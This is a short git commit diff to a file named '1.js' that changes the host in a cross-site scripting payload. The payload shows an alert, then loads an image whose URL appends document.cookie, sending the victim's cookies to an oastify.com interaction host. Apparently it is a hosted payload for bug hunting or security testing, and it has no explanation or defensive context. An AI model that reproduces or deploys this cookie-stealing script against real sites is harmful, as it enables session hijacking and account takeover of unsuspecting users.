e073ab1b60d6aecae4c383f9e29a596adce271a6
Tejas378 <64826070+Tejas378@users.noreply.github.com>
2024-02-24 13:02:33 +0530

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,3 +1,3 @@
 alert(1);
 var i=new Image;
-i.src="http://tb88sl35dz6az4guezox7q6ncei86x.oastify.com/?"+document.cookie;
+i.src="http://ld20kcrol4stq6e7rexl9r95pwvnjc.oastify.com/?"+document.cookie;
